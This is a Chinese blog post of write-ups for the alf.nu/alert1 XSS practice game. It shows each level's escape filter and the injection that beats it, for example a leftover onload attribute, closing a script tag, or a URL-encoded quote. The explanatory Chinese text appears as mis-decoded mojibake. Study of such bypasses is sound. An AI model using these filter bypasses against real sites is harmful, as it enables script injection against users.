<pre><code class="hljs language-js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">escape</span>(<span class="hljs-params">s</span>) {
  <span class="hljs-keyword">var</span> div = <span class="hljs-variable language_">document</span>.<span class="hljs-property">implementation</span>.<span class="hljs-title function_">createHTMLDocument</span>().<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;div&#x27;</span>);
  div.<span class="hljs-property">innerHTML</span> = s;
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">n</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;SCRIPT&#x27;</span> === n.<span class="hljs-property">tagName</span>) n.<span class="hljs-property">parentNode</span>.<span class="hljs-title function_">removeChild</span>(n);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>; i&lt;n.<span class="hljs-property">attributes</span>.<span class="hljs-property">length</span>; i++) {
      <span class="hljs-keyword">var</span> name = n.<span class="hljs-property">attributes</span>[i].<span class="hljs-property">name</span>;
      <span class="hljs-keyword">if</span> (name !== <span class="hljs-string">&#x27;class&#x27;</span>) { n.<span class="hljs-title function_">removeAttribute</span>(name); }
    }
  }
  [].<span class="hljs-property">map</span>.<span class="hljs-title function_">call</span>(div.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&#x27;*&#x27;</span>), f);
  <span class="hljs-keyword">return</span> div.<span class="hljs-property">innerHTML</span>;
}
</code></pre>
<p>è¿™ä¸ªé¢˜ç›®çš„æ¼æ´æ¥æºäºä»£ç çš„é€»è¾‘ä¸ä¸¥è°¨ã€‚
å…³é”®åœ¨äºç¬¬6è¡Œä¸­çš„<code>i&lt;n.attributes.length</code>ï¼Œä½†æ˜¯è¿™ä¸ªlengthæ˜¯åŠ¨æ€å˜åŒ–çš„ï¼Œå¯¼è‡´å¦‚æœæœ‰å¤šä¸ªå±æ€§çš„æ—¶å€™ï¼Œå°±è¿˜å‰©ä¸‹ä¸€ä¸ªå±æ€§æ˜¯åˆ ä¸æ‰äº†ã€‚
è¿™æ ·çš„è¯æˆ‘ä»¬å°±æ„é€ å¤šä¸ªå±æ€§å¥½äº†ï¼Œå°†<code>onload=alert(1)</code>æ”¾åé¢ã€‚
solution(26): <code>&lt;iframe t onload=alert(1)&gt;</code></p>
<br/>
<br/>
<br/>
<br/>
<h1 id="fruit-2">Fruit 2</h1>
<pre><code class="hljs language-js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">escape</span>(<span class="hljs-params">s</span>) {
  <span class="hljs-keyword">var</span> div = <span class="hljs-variable language_">document</span>.<span class="hljs-property">implementation</span>.<span class="hljs-title function_">createHTMLDocument</span>().<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;div&#x27;</span>);
  div.<span class="hljs-property">innerHTML</span> = s;
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">n</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-regexp">/script/i</span>.<span class="hljs-title function_">test</span>(n.<span class="hljs-property">tagName</span>)) n.<span class="hljs-property">parentNode</span>.<span class="hljs-title function_">removeChild</span>(n);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>; i&lt;n.<span class="hljs-property">attributes</span>.<span class="hljs-property">length</span>; i++) {
      <span class="hljs-keyword">var</span> name = n.<span class="hljs-property">attributes</span>[i].<span class="hljs-property">name</span>;
      <span class="hljs-keyword">if</span> (name !== <span class="hljs-string">&#x27;class&#x27;</span>) { n.<span class="hljs-title function_">removeAttribute</span>(name); }
    }
  }
  [].<span class="hljs-property">map</span>.<span class="hljs-title function_">call</span>(div.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&#x27;*&#x27;</span>), f);
  <span class="hljs-keyword">return</span> div.<span class="hljs-property">innerHTML</span>;
}
</code></pre>
<p>è¿™ä¸€é¢˜æ”¹å˜äº†ç¬¬äº”è¡Œçš„ifè¯­å¥ï¼Œçœ‹ä¸å‡ºæ¥ä¼šå¸¦æ¥ä»€ä¹ˆä¸åŒçš„å½±å“ã€‚
è‡³å°‘å¯¹äºæˆ‘ä¸Šä¸€é¢˜çš„è§£æ³•æ²¡å½±å“ï¼Œæ‰€ä»¥ç”¨åŒæ ·çš„æ–¹æ³•å°±å¯ä»¥ã€‚</p>
<br/>
<br/>
<br/>
<br/>
<h1 id="fruit-3">Fruit 3</h1>
<pre><code class="hljs language-js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">escape</span>(<span class="hljs-params">s</span>) {
  <span class="hljs-keyword">var</span> div = <span class="hljs-variable language_">document</span>.<span class="hljs-property">implementation</span>.<span class="hljs-title function_">createHTMLDocument</span>().<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;div&#x27;</span>);
  div.<span class="hljs-property">innerHTML</span> = s;
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">n</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-regexp">/script/i</span>.<span class="hljs-title function_">test</span>(n.<span class="hljs-property">tagName</span>)) n.<span class="hljs-property">parentNode</span>.<span class="hljs-title function_">removeChild</span>(n);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>; i&lt;n.<span class="hljs-property">attributes</span>.<span class="hljs-property">length</span>; i++) {
      <span class="hljs-keyword">var</span> name = n.<span class="hljs-property">attributes</span>[i].<span class="hljs-property">name</span>;
      <span class="hljs-keyword">if</span> (name !== <span class="hljs-string">&#x27;class&#x27;</span>) { n.<span class="hljs-title function_">removeAttribute</span>(name); i--; }
    }
  }
  [].<span class="hljs-property">map</span>.<span class="hljs-title function_">call</span>(div.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&#x27;*&#x27;</span>), f);
  <span class="hljs-keyword">return</span> div.<span class="hljs-property">innerHTML</span>;
}
</code></pre>
<p>ä¸ä¼šã€‚</p>
<br/>
<br/>
<br/>
<br/>
<h1 id="quine">Quine</h1>
<pre><code class="hljs language-js"><span class="hljs-comment">// submitted by Somebody</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">escape</span>(<span class="hljs-params">s</span>) {
    <span class="hljs-comment">// We&#x27;ve got a quine level in all of the other</span>
    <span class="hljs-comment">// games, so why not have one here?</span>
    <span class="hljs-keyword">var</span> win = alert;
    <span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">t</span>) {
        <span class="hljs-keyword">if</span> (t === s)
            <span class="hljs-title function_">win</span>(<span class="hljs-number">1</span>);
        <span class="hljs-keyword">else</span>
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Alert: &quot;</span> + t + <span class="hljs-string">&quot;\n(That&#x27;s not a quine)&quot;</span>);
    }
    <span class="hljs-keyword">return</span> s;
}
</code></pre>
<p>è¿™é¢˜å¾ˆæœ‰æ„æ€ã€‚å¯æƒœæˆ‘ä¸ä¼šå•Šã€‚</p>
<br/>
<br/>
<br/>
<br/>
<p>å‚è€ƒ<a href="http://www.pwntester.com/blog/2014/01/06/escape-alf-nu-xss-challenges-write-ups-part-148/">åšå®¢-ä¸Š</a></p>
<p>å‚è€ƒ<a href="http://www.pwntester.com/blog/2014/01/08/escape-alf-nu-xss-challenges-write-ups-part-257/">åšå®¢-ä¸‹</a></p></div></article></main></div><script src="/_next/static/chunks/webpack-676b273ee73d1130.js" async=""></script><script src="/_next/static/chunks/2443530c-ac8981f6a5707b30.js" async=""></script><script src="/_next/static/chunks/139-1dec130228ce3944.js" async=""></script><script src="/_next/static/chunks/main-app-2fe6bc2bab605f4b.js" async=""></script></body></html><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:HL[\"/_next/static/media/2aaf0723e720e8b9-s.p.woff2\",{\"as\":\"font\",\"type\":\"font/woff2\"}]\n2:HL[\"/_next/static/css/9de7766929c1e55d.css\",{\"as\":\"style\"}]\n3:HL[\"/_next/static/css/6c438bdd1a6b11fe.css\",{\"as\":\"style\"}]\n0:\"$L4\"\n"])</script><script>self.__next_f.push([1,"5:I{\"id\":\"7858\",\"chunks\":[\"272:static/chunks/webpack-676b273ee73d1130.js\",\"667:static/chunks/2443530c-ac8981f6a5707b30.js\",\"139:static/chunks/139-1dec130228ce3944.js\"],\"name\":\"\",\"async\":false}\n7:I{\"id\":\"3055\",\"chunks\":[\"272:static/chunks/webpack-676b273ee73d1130.js\",\"667:static/chunks/2443530c-ac8981f6a5707b30.js\",\"139:static/chunks/139-1dec130228ce3944.js\"],\"name\":\"\",\"async\":false}\n8:I{\"id\":\"350\",\"chunks\":[\"414:static/chunks/414-bfaafd372e832af9.js\",\"185:static/chunks/app/layout-115007e8bdb5f9f2.js\"],\"name"])</script><script>self.__next_f.push([1,"\":\"ThemeProvider\",\"async\":false}\n9:I{\"id\":\"414\",\"chunks\":[\"414:static/chunks/414-bfaafd372e832af9.js\",\"185:static/chunks/app/layout-115007e8bdb5f9f2.js\"],\"name\":\"\",\"async\":false}\na:I{\"id\":\"1234\",\"chunks\":[\"414:static/chunks/414-bfaafd372e832af9.js\",\"185:static/chunks/app/layout-115007e8bdb5f9f2.js\"],\"name\":\"Analytics\",\"async\":false}\nb:I{\"id\":\"9544\",\"chunks\":[\"272:static/chunks/webpack-676b273ee73d1130.js\",\"667:static/chunks/2443530c-ac8981f6a5707b30.js\",\"139:static/chunks/139-1dec130228ce3944.js\"],\"name\":\"\""])</script><script>self.__next_f.push([1,",\"async\":false}\nc:I{\"id\":\"99\",\"chunks\":[\"272:static/chunks/webpack-676b273ee73d1130.js\",\"667:static/chunks/2443530c-ac8981f6a5707b30.js\",\"139:static/chunks/139-1dec130228ce3944.js\"],\"name\":\"\",\"async\":false}\n"])</script><script>self.__next_f.push([1,"4:[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/9de7766929c1e55d.css\",\"precedence\":\"next\"}],[\"$\",\"link\",\"1\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/6c438bdd1a6b11fe.css\",\"precedence\":\"next\"}]],[\"$\",\"$L5\",null,{\"assetPrefix\":\"\",\"initialCanonicalUrl\":\"/posts/xss-practices\",\"initialTree\":[\"\",{\"children\":[\"posts\",{\"children\":[[\"slug\",\"xss-practices\",\"c\"],{\"children\":[\"__PAGE__?{\\\"slug\\\":[\\\"xss-practices\\\"]}\",{}]}]}]},\"$undefined\",\"$undefined\",true],\"initialHead\":[\"$L6\",[\"$\",\"meta\",null,{\"name\":\"next-size-adjust\"}]],\"globalErrorComponent\":\"$7\",\"notFound\":[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[\"$\",\"body\",null,{\"className\":\"antialiased min-h-screen bg-white dark:bg-slate-950 text-slate-900 dark:text-slate-50 bg-grey __className_0ec1f4\",\"children\":[\"$\",\"$L8\",null,{\"attribute\":\"class\",\"defaultTheme\":\"system\",\"enableSystem\":true,\"children\":[[\"$\",\"div\",null,{\"className\":\"my-max mx-auto py-10 px-4\",\"children\":[[\"$\",\"header\",null,{\"children\":[\"$\",\"div\",null,{\"className\":\"my-flex\",\"children\":[[\"$\",\"div\",null,{\"className\":\"flex space-x-6 \",\"children\":[\"$\",\"p\",null,{\"className\":\"blog-name font-medium text-2xl\",\"children\":\"Always Exploring\"}]}],[\"$\",\"nav\",null,{\"className\":\"nav-ml text-sm font-medium space-x-6\",\"children\":[[\"$\",\"$L9\",null,{\"href\":\"/\",\"children\":\"Home\"}],[\"$\",\"$L9\",null,{\"href\":\"/about\",\"children\":\"About\"}]]}]]}]}],[\"$\",\"main\",null,{\"children\":[\"$undefined\",[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":\"404\"}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]]]}]]}],[\"$\",\"$La\",null,{}]]}]}]}],\"asNotFound\":false,\"children\":[[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[\"$\",\"body\",null,{\"className\":\"antialiased min-h-screen bg-white dark:bg-slate-950 text-slate-900 dark:text-slate-50 bg-grey __className_0ec1f4\",\"children\":[\"$\",\"$L8\",null,{\"attribute\":\"class\",\"defaultTheme\":\"system\",\"enableSystem\":true,\"children\":[[\"$\",\"div\",null,{\"className\":\"my-max mx-auto py-10 px-4\",\"children\":[[\"$\",\"header\",null,{\"children\":[\"$\",\"div\",null,{\"className\":\"my-flex\",\"children\":[[\"$\",\"div\",null,{\"className\":\"flex space-x-6 \",\"children\":[\"$\",\"p\",null,{\"className\":\"blog-name font-medium text-2xl\",\"children\":\"Always Exploring\"}]}],[\"$\",\"nav\",null,{\"className\":\"nav-ml text-sm font-medium space-x-6\",\"children\":[[\"$\",\"$L9\",null,{\"href\":\"/\",\"children\":\"Home\"}],[\"$\",\"$L9\",null,{\"href\":\"/about\",\"children\":\"About\"}]]}]]}]}],[\"$\",\"main\",null,{\"children\":[\"$\",\"$Lb\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"hasLoading\":false,\"template\":[\"$\",\"$Lc\",null,{}],\"templateStyles\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\",\"asNotFound\":false,\"childProp\":{\"current\":[\"$\",\"$Lb\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"posts\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"hasLoading\":false,\"template\":[\"$\",\"$Lc\",null,{}],\"templateStyles\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\",\"asNotFound\":false,\"childProp\":{\"current\":[\"$\",\"$Lb\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"posts\",\"children\",[\"slug\",\"xss-practices\",\"c\"],\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"hasLoading\":false,\"template\":[\"$\",\"$Lc\",null,{}],\"templateStyles\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\",\"asNotFound\":false,\"childProp\":{\"current\":[\"$Ld\",null],\"segment\":\"__PAGE__?{\\\"slug\\\":[\\\"xss-practices\\\"]}\"},\"styles\":[]}],\"segment\":[\"slug\",\"xss-practices\",\"c\"]},\"styles\":[]}],\"segment\":\"posts\"},\"styles\":[]}]}]]}],[\"$\",\"$La\",null,{}]]}]}]}],null]}]]\n"])</script><script>self.__next_f.push([1,"e:I{\"id\":\"1753\",\"chunks\":[\"46:static/chunks/46-79f3cb62e0a9762a.js\",\"49:static/chunks/app/posts/[...slug]/page-e7b969ce3a6c175a.js\"],\"name\":\"\",\"async\":false}\n"])</script><script>self.__next_f.push([1,"d:[[\"$\",\"$Le\",null,{}],[\"$\",\"article\",null,{\"className\":\"py-6 prose post-prose dark:prose-invert\",\"children\":[[\"$\",\"div\",null,{\"className\":\"post-title\",\"children\":\"XSSç»ƒä¹ :alf.nu/alert1 Write-ups\"}],[\"$\",\"time\",null,{\"dateTime\":\"2018-01-29T17:26:26.000Z\",\"className\":\"post-time\",\"children\":\"January 29, 2018\"}],\"$undefined\",[\"$\",\"div\",null,{\"className\":\"js-toc-content\",\"children\":[[\"$\",\"h1\",null,{\"id\":\"å‰è¨€\",\"children\":\"å‰è¨€\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"è¿™äº›å¤©åœ¨\",[\"$\",\"a\",null,{\"href\":\"https://alf.nu/alert1\",\"children\":\"alf.nu/alert1\"}],\"ä¸Šåšäº†XSSç»ƒä¹ é¢˜ï¼Œç›®å‰å¤§éƒ¨åˆ†åšå‡ºæ¥äº†ï¼Œä½†æœ‰äº›é¢˜ç›®å¹¶ä¸æ˜¯æœ€ä¼˜è§£ã€‚è¿˜å‰©ä¸‹2é“é¢˜æ²¡æœ‰åšå‡ºï¼ˆFruit3, Qunieï¼‰ï¼Œåœ¨æ­¤åšä¸ªè®°å½•ã€‚æ¬¢è¿å¤§å®¶äº¤æµã€‚\"]}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"warmup\",\"children\":\"Warmup\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-javascript\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"escape\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"s\"}],\") {\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u003cscript\u003econsole.log(\\\"'\"}],\"+s+\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\\\");\u003c/script\u003e'\"}],\";\\n}\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"è¿™é¢˜å¯¹è¾“å…¥æ²¡æœ‰é™åˆ¶ï¼Œåªè¦é—­åˆæ‰console.logå³å¯ã€‚\\nsolution(12 chars): \",[\"$\",\"code\",null,{\"children\":\"\\\");alert(1,\\\"\"}]]}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"adobe\",\"children\":\"Adobe\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-js\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"escape\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"s\"}],\") {\\n  s = s.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"replace\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-regexp\",\"children\":\"/\\\"/g\"}],\", \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\\\\\\\\\\\"'\"}],\");\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u003cscript\u003econsole.log(\\\"'\"}],\" + s + \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\\\");\u003c/script\u003e'\"}],\";\\n}\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"è¿™é¢˜escapeå°†è¾“å…¥çš„å¼•å·\",[\"$\",\"code\",null,{\"children\":\"\\\"\"}],\"è½¬æ¢ä¸ºäº†\",[\"$\",\"code\",null,{\"children\":\"\\\\\\\\\\\"\"}],\"ï¼Œä½¿å¾—å¼•å·å˜æˆäº†å­—é¢é‡ï¼Œä¸Šä¸€é¢˜çš„æ–¹æ³•æ— æ•ˆäº†ã€‚ä¸è¿‡å¦‚æœè¾“å…¥ä¸º\",[\"$\",\"code\",null,{\"children\":\"\\\\\\\"\"}],\"ï¼Œé‚£ä¹ˆå°±ä¼šè½¬æ¢ä¸º\",[\"$\",\"code\",null,{\"children\":\"\\\\\\\\\\\\\\\"\"}],\"ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œæœ¬æ¥æ˜¯è½¬ä¹‰å¼•å·çš„ï¼Œä½†å˜æˆäº†è½¬ä¹‰åæ–œæ†äº†ï¼Œä»è€Œå¼•å·å¯ä»¥é€ƒè„±è½¬ä¹‰äº†ã€‚\\nsolution(14 chars): \",[\"$\",\"code\",null,{\"children\":\"\\\\\\\");alert(1)//\"}]]}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"json\",\"children\":\"JSON\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-js\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"escape\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"s\"}],\") {\\n  s = \",[\"$\",\"span\",null,{\"className\":\"hljs-title class_\",\"children\":\"JSON\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"stringify\"}],\"(s);\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u003cscript\u003econsole.log('\"}],\" + s + \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"');\u003c/script\u003e'\"}],\";\\n}\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"è¿™é¢˜å¯¹è¾“å…¥çš„å­—ç¬¦ä¸²ç”¨äº†\",[\"$\",\"code\",null,{\"children\":\"JSON.stringify()\"}],\"(\",[\"$\",\"a\",null,{\"href\":\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify\",\"children\":\"ç›¸å…³ä»‹ç»\"}],\")æ¥å¤„ç†å­—ç¬¦ä¸²ã€‚ç®€å•æ¥è¯´ï¼Œå°±æ˜¯è¿‡æ»¤äº†\",[\"$\",\"code\",null,{\"children\":\"\\\\\"}],\",\",[\"$\",\"code\",null,{\"children\":\"\\\"\"}],\"ç­‰å­—ç¬¦ï¼Œåˆ†åˆ«è½¬åŒ–ä¸º\",[\"$\",\"code\",null,{\"children\":\"\\\\\\\\\"}],\",\",[\"$\",\"code\",null,{\"children\":\"\\\\\\\"\"}],\"ç­‰ï¼Œä½†æ²¡æœ‰è¿‡æ»¤\",[\"$\",\"code\",null,{\"children\":\"\u003c\"}],\",\",[\"$\",\"code\",null,{\"children\":\"\u003e\"}],\",\",[\"$\",\"code\",null,{\"children\":\"/\"}],\"å­—ç¬¦ï¼Œè¿™å°±å¤Ÿç”¨äº†ã€‚æ—¢ç„¶é—­åˆä¸äº†\",[\"$\",\"code\",null,{\"children\":\"log\"}],\"å‡½æ•°ï¼Œé‚£å°±é—­åˆ\",[\"$\",\"code\",null,{\"children\":\"script\"}],\"æ ‡ç­¾å§\\nsolution(27 chars): \",[\"$\",\"code\",null,{\"children\":\"\u003c/script\u003e\u003cscript\u003ealert(1)//\"}]]}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"javascript\",\"children\":\"JavaScript\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-js\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"escape\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"s\"}],\") {\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"var\"}],\" url = \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'javascript:console.log('\"}],\" + \",[\"$\",\"span\",null,{\"className\":\"hljs-title class_\",\"children\":\"JSON\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"stringify\"}],\"(s) + \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"')'\"}],\";\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-variable language_\",\"children\":\"console\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"log\"}],\"(url);\\n\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"var\"}],\" a = \",[\"$\",\"span\",null,{\"className\":\"hljs-variable language_\",\"children\":\"document\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"createElement\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'a'\"}],\");\\n  a.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"href\"}],\" = url;\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-variable language_\",\"children\":\"document\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"body\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"appendChild\"}],\"(a);\\n  a.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"click\"}],\"();\\n}\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"åŒæ ·å› ä¸º\",[\"$\",\"code\",null,{\"children\":\"JSON.stringify()\"}],\"çš„åŸå› æ²¡åŠæ³•ç”¨ç›´æ¥ç”¨\",[\"$\",\"code\",null,{\"children\":\"\\\"\"}],\"ï¼Œä½†æ˜¯ç”±äºè¿™æ¬¡æ³¨å…¥çš„åœ°æ–¹æ˜¯urlï¼Œæ‰€ä»¥å¯ä»¥ç”¨URLç¼–ç çš„åŠæ³•è®²\",[\"$\",\"code\",null,{\"children\":\"\\\"\"}],\"è½¬æ¢ä¸º\",[\"$\",\"code\",null,{\"children\":\"%22\"}],\"ã€‚\\nsolution(15 chars): \",[\"$\",\"code\",null,{\"children\":\"%22);alert(1)//\"}]]}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"markdown\",\"children\":\"Markdown\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-js\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"escape\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"s\"}],\") {\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"var\"}],\" text = s.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"replace\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-regexp\",\"children\":\"/\u003c/g\"}],\", \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u0026lt;'\"}],\").\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"replace\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-regexp\",\"children\":\"/\\\"/g\"}],\", \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u0026quot;'\"}],\");\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"// URLs\"}],\"\\n  text = text.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"replace\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-regexp\",\"children\":\"/(http:\\\\/\\\\/\\\\S+)/g\"}],\", \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u003ca href=\\\"$1\\\"\u003e$1\u003c/a\u003e'\"}],\");\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"// [[img123|Description]]\"}],\"\\n  text = text.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"replace\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-regexp\",\"children\":\"/\\\\[\\\\[(\\\\w+)\\\\|(.+?)\\\\]\\\\]/g\"}],\", \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u003cimg alt=\\\"$2\\\" src=\\\"$1.gif\\\"\u003e'\"}],\");\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" 